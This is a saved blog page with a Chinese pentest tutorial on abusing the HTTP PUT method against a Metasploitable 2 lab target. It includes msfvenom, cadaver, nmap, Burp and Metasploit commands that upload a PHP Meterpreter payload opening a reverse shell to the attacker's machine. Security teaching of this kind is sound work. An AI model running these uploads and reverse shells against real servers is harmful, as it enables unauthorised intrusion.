@@ -1,0 +1,1117 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="首先，我们将确定是否在目标受害者计算机上启用了HTTP PUT方法，我们将使用几种不同的方法在目标上传上Meterpreter反向shell并对其进行攻击。 0x01表中的内容 我介绍了HTTP PUT方法 扫描HTTP PUT方法（Nikto） 利用尸体开发PUT方法 利用Nmap开发  PUT方法 利用海报开发  PUT方法 利用 Metasploit 开发  PUT方法 利用 Burpsui">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用PUT方法的多种方法">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/23/2018-12-23-利用PUT方法的多种方法/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="首先，我们将确定是否在目标受害者计算机上启用了HTTP PUT方法，我们将使用几种不同的方法在目标上传上Meterpreter反向shell并对其进行攻击。 0x01表中的内容 我介绍了HTTP PUT方法 扫描HTTP PUT方法（Nikto） 利用尸体开发PUT方法 利用Nmap开发  PUT方法 利用海报开发  PUT方法 利用 Metasploit 开发  PUT方法 利用 Burpsui">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i1.wp.com/4.bp.blogspot.com/-IAvnCT5J0D0/W77ri1o1mRI/AAAAAAAAaq0/r9dKhua-6iwzivv_6hHEIHMCueQuLH1kwCEwYBhgL/s1600/1.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-_fKRSGfCCgA/W77rlIJD1XI/AAAAAAAAaqo/SA6dYhM9WtUVv3H6ryRskxjAktX8OgzmQCEwYBhgL/s1600/2.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/1.bp.blogspot.com/-ai6_PuZKAtU/W77rl0U7yzI/AAAAAAAAaq0/_yom0zpAx4ID2rNrdTJvQvzx8WSLEKXBQCEwYBhgL/s1600/3.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/4.bp.blogspot.com/-orYWQsnvyQQ/W77rmHlDItI/AAAAAAAAaqI/PDRguU1qCtIyIFqsEWCcjV6Rh8dRAYQhQCEwYBhgL/s1600/4.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-yG32I2RGUeY/W77rmDmgKSI/AAAAAAAAaqs/Ss7Yu3qYMSgwizHtwTE6I0Z5x7pS0zL3wCEwYBhgL/s1600/5.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/1.bp.blogspot.com/-TvOtpJaXils/W77rmVp2B8I/AAAAAAAAaqw/H2g5L6Yr4CkURrBMgEWMxQX9I3gRuqrpwCEwYBhgL/s1600/6.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/3.bp.blogspot.com/-els_LacO3vo/W77rm2psBgI/AAAAAAAAaqw/BrGv-I3DGBojQptXytnaLc3tYfS48w3rgCEwYBhgL/s1600/7.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-LTOaoA34ITg/W77rnfaZ41I/AAAAAAAAaq0/09RjXZx37zUjv2wG6Mghh6LqTdweKZY9wCEwYBhgL/s1600/8.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/3.bp.blogspot.com/-KR1ALvq0nvc/W77rnECSIPI/AAAAAAAAaqY/jgYOrjezrww8MBqQRyIdNYM_T-cxoS5XQCEwYBhgL/s1600/9.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/3.bp.blogspot.com/-3184VfcbqFs/W77rjJrkjuI/AAAAAAAAaqg/UHEV0USTGnsw1IFAwPPjWQX4lFAyFeJSQCEwYBhgL/s1600/10.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/1.bp.blogspot.com/-C-tuuFu7ezs/W77rjMRoNNI/AAAAAAAAaq0/C0FT-zPRUnAt_u7EkhWgkoMu2NmkK1ovwCEwYBhgL/s1600/11.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/1.bp.blogspot.com/-4VC6GAbwlk0/W77rjuzWlWI/AAAAAAAAaqk/2j4EUs3OEbs93k9oKaRFP0JjvvPrXUUngCEwYBhgL/s1600/12.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/2.bp.blogspot.com/-ZwOoTL28hMg/W77rjvwmKPI/AAAAAAAAapY/bbI2afPf4NEQzq_uPTGcXGrE3LG4m2QvQCEwYBhgL/s1600/13.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/2.bp.blogspot.com/-qQhk13RoVhw/W77rjxnWxjI/AAAAAAAAaq0/8iBXssgaXX8I2-NiSK_TyR2PibAWuE5lwCEwYBhgL/s1600/14.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/2.bp.blogspot.com/-AyBQmVxBQAU/W77rkCU45NI/AAAAAAAAaqs/cfwoBynG2s8BW8C_tjKKEtDCtOKXkBmNACEwYBhgL/s1600/15.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/4.bp.blogspot.com/-847UTwuj7Ic/W77rkILqtQI/AAAAAAAAaqo/eGJGmT_PuNoKNwT5JUwRk8k7n20swx4EwCEwYBhgL/s1600/16.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/1.bp.blogspot.com/-UgEr2Yr62zc/W77rkVegsHI/AAAAAAAAaqw/_g91tLVqKZYk0Xdok8MV99PNwXs5Wf_lwCEwYBhgL/s1600/17.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/4.bp.blogspot.com/-tOZRLMDQ8y4/W77rkhs-ilI/AAAAAAAAaqw/0spu0p-6fxoFpSortWVf99HYJLKHPMCVACEwYBhgL/s1600/18.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/3.bp.blogspot.com/-Xtw0_4WL1GE/W77rk6gdCyI/AAAAAAAAapw/gipaCNagefk8ru9lpgGvVpT76WErG4p4wCEwYBhgL/s1600/19.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/1.bp.blogspot.com/-FXYI2gJx5aw/W77rlHUWziI/AAAAAAAAaqk/rXCIGrnnUJs8dvw8k2VQ39-m8V7CvmBewCEwYBhgL/s1600/20.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/1.bp.blogspot.com/-_KL9pTHjtSA/W77rlh45foI/AAAAAAAAaq0/uh8M3MDSSHEVwtbg8Kh5oPHtvJjphLX8gCEwYBhgL/s1600/21.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/1.bp.blogspot.com/-UXj9gK3LABE/W77rludV3UI/AAAAAAAAaqo/LSN6R3rE2N0fyFqjQtnVFYFoa8y-jHMwgCEwYBhgL/s1600/22.png?w=687&ssl=1">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.213Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用PUT方法的多种方法">
+<meta name="twitter:description" content="首先，我们将确定是否在目标受害者计算机上启用了HTTP PUT方法，我们将使用几种不同的方法在目标上传上Meterpreter反向shell并对其进行攻击。 0x01表中的内容 我介绍了HTTP PUT方法 扫描HTTP PUT方法（Nikto） 利用尸体开发PUT方法 利用Nmap开发  PUT方法 利用海报开发  PUT方法 利用 Metasploit 开发  PUT方法 利用 Burpsui">
+<meta name="twitter:image" content="https://i1.wp.com/4.bp.blogspot.com/-IAvnCT5J0D0/W77ri1o1mRI/AAAAAAAAaq0/r9dKhua-6iwzivv_6hHEIHMCueQuLH1kwCEwYBhgL/s1600/1.png?w=687&ssl=1">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/23/2018-12-23-利用PUT方法的多种方法/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>利用PUT方法的多种方法 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/23/2018-12-23-利用PUT方法的多种方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">利用PUT方法的多种方法
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-23 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-23T00:00:00+08:00">2018-12-23</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">5k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">5 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p>首先，我们将确定是否在目标受害者计算机上启用了HTTP PUT方法，我们将使用几种不同的方法在目标上传上Meterpreter反向shell并对其进行攻击。</p>
+<h3 id="0x01表中的内容"><a href="#0x01表中的内容" class="headerlink" title="0x01表中的内容"></a><strong>0x01表中的内容</strong></h3><ul>
+<li>我介绍了HTTP PUT方法</li>
+<li>扫描HTTP PUT方法（Nikto）</li>
+<li>利用尸体开发PUT方法</li>
+<li>利用Nmap开发  PUT方法</li>
+<li>利用海报开发  PUT方法</li>
+<li>利用 Metasploit 开发  PUT方法</li>
+<li>利用 Burpsuite 开发  PUT方法</li>
+<li>利用Curl开发  PUT方法</li>
+</ul>
+<h3 id="0x02HTTP-PUT方法简介"><a href="#0x02HTTP-PUT方法简介" class="headerlink" title="0x02HTTP PUT方法简介"></a>0x02HTTP PUT方法简介</h3><p>PUT方法最初是作为用于文件管理操作的HTTP方法之一。如果在Web服务器上启用了HTTP PUT方法，则可以使用它将恶意资源上载到目标服务器（例如Web shell）并执行它</p>
+<p>由于此方法用于更改或删除目标服务器文件系统中的文件，因此通常会导致各种文件上载漏洞，从而导致严重和危险的攻击。作为最佳实践，组织的文件访问权限如果组织绝对必须启用这些方法，则应严格限制关键服务器以及对授权用户的限制访问。</p>
+<p><strong>注意：</strong>在本教程中，我们使用一个易受攻击的目标机器进行Pentesting目的并说明各种工具的使用。这纯粹是出于测试环境中的教育目的，未经相关机构/管理层的授权许可，不得在生产环境中使用。</p>
+<p><strong>要求</strong></p>
+<p><strong>目标：</strong> Metasploitable 2</p>
+<p><strong>攻击者：</strong> Kali Linux机器</p>
+<p><strong>让我们开始！！！！</strong></p>
+<p>启动Kali Linux计算机（IP：<strong>192.168.1.105</strong>）并同时在Firefox浏览器中键入受害者IP为<strong>192.168.1.103</strong>，然后单击WEBDAV。正如我们从屏幕截图中看到的那样，它只列出了父目录。</p>
+<p><img src="https://i1.wp.com/4.bp.blogspot.com/-IAvnCT5J0D0/W77ri1o1mRI/AAAAAAAAaq0/r9dKhua-6iwzivv_6hHEIHMCueQuLH1kwCEwYBhgL/s1600/1.png?w=687&ssl=1" alt="img"></p>
+<p>首先，我们需要确保易受攻击的目标机器具有允许我们上传恶意后门的HTTP PUT方法。为了确认相同，我们需要使用Nikto扫描目标。</p>
+<p>Nikto是一种流行的Web服务器扫描程序，可以测试Web服务器是否存在危险文件/ CGI，过时的服务器软件和其他问题。它还执行通用和服务器类型特定检查.Below是扫描URL的命令：</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>nikto -h <a href="http://192.168.1.103/dav/" target="_blank" rel="noopener">http://192.168.1.103/dav/</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>运行上述命令后，我们可以观察到下面屏幕截图中突出显示的部分显示允许HTTP PUT方法。现在让我们通过使用下一节中显示的各种技术上传PHP恶意文件来攻击易受攻击的目标机器。</p>
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-_fKRSGfCCgA/W77rlIJD1XI/AAAAAAAAaqo/SA6dYhM9WtUVv3H6ryRskxjAktX8OgzmQCEwYBhgL/s1600/2.png?w=687&ssl=1" alt="img"></p>
+<p>准备要使用msfvenom上传的恶意文件：</p>
+<p>Msfvenom可用于创建PHP meterpreter有效负载，为我们提供反向shell。执行以下命令以执行相同操作</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.105 lport=4444 -f raw</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>将代码从<strong>&lt;？php</strong>复制<strong>到die（）</strong>并将其保存在桌面上具有.php扩展名为<strong>shell.php</strong>文件的文件中。这将在后面的部分中使用，以便在Web服务器上上传文件。</p>
+<p><img src="https://i2.wp.com/1.bp.blogspot.com/-ai6_PuZKAtU/W77rl0U7yzI/AAAAAAAAaq0/_yom0zpAx4ID2rNrdTJvQvzx8WSLEKXBQCEwYBhgL/s1600/3.png?w=687&ssl=1" alt="img"></p>
+<p>同时，通过在新终端上键入msfconsole来加载metasploit框架并启动multi / handler。这将在本节的后面部分中使用</p>
+<h3 id="0x03Cadaver"><a href="#0x03Cadaver" class="headerlink" title="0x03Cadaver"></a><strong>0x03Cadaver</strong></h3><p>Cadaver是预装在Kali机器上的命令行工具，可以在webdav上上传和下载文件。</p>
+<p>使用下面给出的命令键入目标主机URL以上载恶意文件。</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>cadaver <a href="http://192.168.1.103/dav/" target="_blank" rel="noopener">http://192.168.1.103/dav/</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>现在，一旦我们进入受害者的目录，通过执行以下命令将文件<strong>shell.php</strong>从Desktop 上传到目标机器的路径：</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>put /root/Desktop/shell.php</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="https://i0.wp.com/4.bp.blogspot.com/-orYWQsnvyQQ/W77rmHlDItI/AAAAAAAAaqI/PDRguU1qCtIyIFqsEWCcjV6Rh8dRAYQhQCEwYBhgL/s1600/4.png?w=687&ssl=1" alt="img"></p>
+<p>要验证文件是否已上载，请在浏览器上运行URL：<strong>192.168.1.103/dav/</strong>。真棒！我们可以看到，恶意文件<strong>shell.php</strong>已经上传到Web服务器上。</p>
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-yG32I2RGUeY/W77rmDmgKSI/AAAAAAAAaqs/Ss7Yu3qYMSgwizHtwTE6I0Z5x7pS0zL3wCEwYBhgL/s1600/5.png?w=687&ssl=1" alt="img"></p>
+<p>现在，让我们启动Metasploit框架并使用exploit / multi / handler模块启动一个处理程序。将其他值（如LHOST和LPORT值）分别分配给Kali机器的IP和端口以进行侦听。完成后，通过运行命令<strong>exploit</strong>来执行以开始侦听传入连接。</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>1</strong></th>
+<th><strong>msf&gt; use exploit/multi/handler</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>2</strong></td>
+<td><strong>msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>3</strong></td>
+<td><strong>msf exploit(handler) &gt; set lhost 192.168.1.105</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>4</strong></td>
+<td><strong>msf exploit(handler) &gt; set lport 4444</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>5</strong></td>
+<td><strong>msf exploit(handler) &gt; exploit</strong></td>
+</tr>
+</tbody></table>
+<p>按Enter键，我们将观察到反向TCP处理程序已在Kali IP 192.168.1.105:4444上启动。</p>
+<p>现在回到之前上传的<strong>shell.php</strong>文件并单击<strong>相同的</strong>文件。一旦运行，我们将在meterpreter shell上自动获得TCP反向连接。进一步在meterpreter会话上运行sysinfo命令以获取机器OS /体系结构详细信息。</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>meterpreter&gt;sysinfo</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p> <strong><img src="https://i0.wp.com/1.bp.blogspot.com/-TvOtpJaXils/W77rmVp2B8I/AAAAAAAAaqw/H2g5L6Yr4CkURrBMgEWMxQX9I3gRuqrpwCEwYBhgL/s1600/6.png?w=687&ssl=1" alt="img"></strong></p>
+<h3 id="0x04NMAP"><a href="#0x04NMAP" class="headerlink" title="0x04NMAP"></a><strong>0x04NMAP</strong></h3><p>Nmap是一个开源端口扫描器和网络开发工具。如果在任何网络服务器上启用PUT方法，我们也可以在NMAP的帮助下将恶意文件上传到远程Web服务器.Below是配置相同的命令。我们必须使用NSE参数指定文件名和URL路径。并行，准备恶意文件<strong>nmap.php</strong>以上传到目标服务器。</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>nmap -p 80 192.168.1.103 --script http-put --script-args http-put.url=&#39;/dav/nmap.php&#39;,http-put.file=&#39;/root/Desktop/nmap.php&#39;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>从下面的屏幕截图中可以看出，nmap.php文件已成功上传。</p>
+<p><img src="https://i1.wp.com/3.bp.blogspot.com/-els_LacO3vo/W77rm2psBgI/AAAAAAAAaqw/BrGv-I3DGBojQptXytnaLc3tYfS48w3rgCEwYBhgL/s1600/7.png?w=687&ssl=1" alt="img"></p>
+<p>在浏览器192.168.1.103/dav中键入相同的URL并执行相同的操作。从屏幕截图中可以看出，文件nmap.php已经上传到Web服务器上。</p>
+<p><img src="https://i2.wp.com/4.bp.blogspot.com/-LTOaoA34ITg/W77rnfaZ41I/AAAAAAAAaq0/09RjXZx37zUjv2wG6Mghh6LqTdweKZY9wCEwYBhgL/s1600/8.png?w=687&ssl=1" alt="img"></p>
+<p>同时，打开metasploit MSF控制台并使用multi / handler; 然后返回先前上传的<strong>nmap.php</strong>文件并运行它。如下所示，这将为我们提供一个仪表预备会话。</p>
+<p><img src="https://i0.wp.com/3.bp.blogspot.com/-KR1ALvq0nvc/W77rnECSIPI/AAAAAAAAaqY/jgYOrjezrww8MBqQRyIdNYM_T-cxoS5XQCEwYBhgL/s1600/9.png?w=687&ssl=1" alt="img"></p>
+<h3 id="0x05Poster"><a href="#0x05Poster" class="headerlink" title="0x05Poster"></a><strong>0x05Poster</strong></h3><p>Poster是一个Firefox附加组件和一个开发人员工具，用于与Web服务交互，让最终用户使用以下参数触发HTTP请求：GET，POST，PUT和DELETE，还可以设置实体主体和内容类型</p>
+<p>准备要上传到目标计算机的恶意文件<strong>poster.php</strong>。从Firefox Add-on安装Poster插件。单击菜单栏中的工具。然后从下拉菜单中单击Poster。将打开以下对话框。键入屏幕截图中提到的URL，并通过“浏览”选项提供要上载的恶意文件的路径，最后单击“PUT”操作。</p>
+<p><img src="https://i1.wp.com/3.bp.blogspot.com/-3184VfcbqFs/W77rjJrkjuI/AAAAAAAAaqg/UHEV0USTGnsw1IFAwPPjWQX4lFAyFeJSQCEwYBhgL/s1600/10.png?w=687&ssl=1" alt="img"></p>
+<p>在浏览器192.168.1.103/dav中键入相同的URL并执行相同的操作。从屏幕截图中可以看出，文件poster.php已经上传到Web服务器上。</p>
+<p><img src="https://i2.wp.com/1.bp.blogspot.com/-C-tuuFu7ezs/W77rjMRoNNI/AAAAAAAAaq0/C0FT-zPRUnAt_u7EkhWgkoMu2NmkK1ovwCEwYBhgL/s1600/11.png?w=687&ssl=1" alt="img"></p>
+<p>同时，打开metasploit MSF控制台并使用multi / handler; 然后回到之前上传的<strong>poster.php</strong>文件并运行它。这将为我们提供一个预备会话。</p>
+<p><img src="https://i0.wp.com/1.bp.blogspot.com/-4VC6GAbwlk0/W77rjuzWlWI/AAAAAAAAaqk/2j4EUs3OEbs93k9oKaRFP0JjvvPrXUUngCEwYBhgL/s1600/12.png?w=687&ssl=1" alt="img"></p>
+<h3 id="0x06Burpsuite"><a href="#0x06Burpsuite" class="headerlink" title="0x06Burpsuite"></a><strong>0x06Burpsuite</strong></h3><p>Burpsuite是最受欢迎的代理拦截工具之一，其图形界面可以有效地用于分析所有类型的GET和POST请求。</p>
+<p>配置最终用户浏览器的手动代理设置，以拦截GET请求浏览URL <a href="http://192.168.1.103但不要按Enter键。与此同时，让我们导航到Burpsuite" target="_blank" rel="noopener">http://192.168.1.103但不要按Enter键。与此同时，让我们导航到Burpsuite</a> <strong>Proxy</strong>选项卡，然后单击<strong>Intercept</strong>子 选项下的<strong>Intercept</strong> <strong>is on</strong>选项，以捕获请求。一旦我们在用户的浏览器中点击ENTER，我们就可以在拦截窗口下获取数据。</p>
+<p>现在右键单击同一窗口，将显示多个选项的列表。进一步单击<strong>Send</strong> <strong>to repeater。</strong></p>
+<p> <strong><img src="https://i0.wp.com/2.bp.blogspot.com/-ZwOoTL28hMg/W77rjvwmKPI/AAAAAAAAapY/bbI2afPf4NEQzq_uPTGcXGrE3LG4m2QvQCEwYBhgL/s1600/13.png?w=687&ssl=1" alt="img"></strong></p>
+<p>在下面突出显示的屏幕截图中，我们将分别观察两个面板 - 分别为HTTP Request和HTTP Response的左侧和右侧。可以在HTTP请求中观察到GET方法，现在我们将用PUT方法替换GET，以便上传名为<strong>burp.php</strong>的文件，该文件包含恶意内容/代码。</p>
+<p>型<strong>PUT /dav/burp.php HTTP / 1.1</strong>中的标题，然后粘贴在PHP恶意代码从&lt;？PHP的开始死亡（）在请求结束时，如下所示。这将上传burp.php文件下通过PUT请求的dav目录。</p>
+<p><img src="https://i2.wp.com/2.bp.blogspot.com/-qQhk13RoVhw/W77rjxnWxjI/AAAAAAAAaq0/8iBXssgaXX8I2-NiSK_TyR2PibAWuE5lwCEwYBhgL/s1600/14.png?w=687&ssl=1" alt="img"></p>
+<p>通过在最终用户的浏览器中浏览相同的URL 192.168.1.103/dav来验证并确认文件上载，我们可以看到<strong>burp.php</strong>文件已上载到Web服务器的/ dav目录中。</p>
+<p><img src="https://i2.wp.com/2.bp.blogspot.com/-AyBQmVxBQAU/W77rkCU45NI/AAAAAAAAaqs/cfwoBynG2s8BW8C_tjKKEtDCtOKXkBmNACEwYBhgL/s1600/15.png?w=687&ssl=1" alt="img"></p>
+<p>同时，打开metasploit MSF控制台并使用multi / handler; 然后回到以前上传的<strong>burp.php</strong>文件并运行它。这将为我们提供一个预备会话。</p>
